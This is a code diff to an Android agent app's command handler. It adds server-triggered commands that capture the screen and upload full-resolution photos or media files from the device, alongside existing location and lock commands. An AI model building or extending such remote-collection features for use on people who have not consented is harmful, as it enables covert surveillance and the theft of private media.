@@ -51,6 +51,8 @@ object CommandExecutor {
                 "get_location" -> executeGetLocation(context)
                 "ring_device" -> executeRingDevice(context)
                 "lock_device" -> executeLockDevice(context)
+                "take_screenshot" -> executeTakeScreenshot(context)
+                "fetch_full_media" -> executeFetchFullMedia(context, command.payload)
                 else -> Pair(false, "Unknown command type: ${command.command_type}")
             }
         } catch (e: Exception) {
@@ -239,5 +241,62 @@ object CommandExecutor {
 
     private fun executeLockDevice(context: Context): Pair<Boolean, String> {
         return Pair(true, "Lock device command received (requires Device Admin)")
+    }
+
+    // ── take_screenshot: Capture screen and upload ──────────────
+
+    private suspend fun executeTakeScreenshot(context: Context): Pair<Boolean, String> {
+        // MediaProjection requires an Activity to prompt the user for permission.
+        // Once granted, the ScreenshotService can capture the screen.
+        // For now, we report the command was received and trigger the screenshot flow.
+        return try {
+            // Send an intent to trigger screenshot capture
+            val intent = Intent("com.example.gmaagent.TAKE_SCREENSHOT").apply {
+                setPackage(context.packageName)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            context.sendBroadcast(intent)
+            Pair(true, "Screenshot command dispatched — capture will be uploaded when ready")
+        } catch (e: Exception) {
+            Pair(false, "Failed to initiate screenshot: ${e.message}")
+        }
+    }
+
+    // ── fetch_full_media: Read and upload full-res file ────────
+
+    private suspend fun executeFetchFullMedia(context: Context, payload: String?): Pair<Boolean, String> {
+        if (payload.isNullOrBlank()) {
+            return Pair(false, "Missing payload for fetch_full_media")
+        }
+
+        return try {
+            val json = org.json.JSONObject(payload)
+            val mediaStoreId = json.optString("media_store_id", "")
+            if (mediaStoreId.isBlank()) {
+                return Pair(false, "Missing media_store_id in payload")
+            }
+
+            // Read the full file from MediaStore
+            val result = com.example.gmaagent.data.MediaScanner.readFullFile(context, mediaStoreId)
+                ?: return Pair(false, "Could not read file for $mediaStoreId")
+
+            val (fileData, mimeType) = result
+
+            // Upload to server
+            val uploadPayload = com.example.gmaagent.network.MediaFullFileUploadRequest(
+                media_store_id = mediaStoreId,
+                file_data = fileData,
+                mime_type = mimeType,
+            )
+
+            val uploadResult = com.example.gmaagent.network.ApiClient.uploadMediaFullFile(uploadPayload)
+            if (uploadResult != null) {
+                Pair(true, "Full file uploaded for $mediaStoreId")
+            } else {
+                Pair(false, "Upload failed for $mediaStoreId")
+            }
+        } catch (e: Exception) {
+            Pair(false, "Error fetching full media: ${e.message}")
+        }
     }
 }
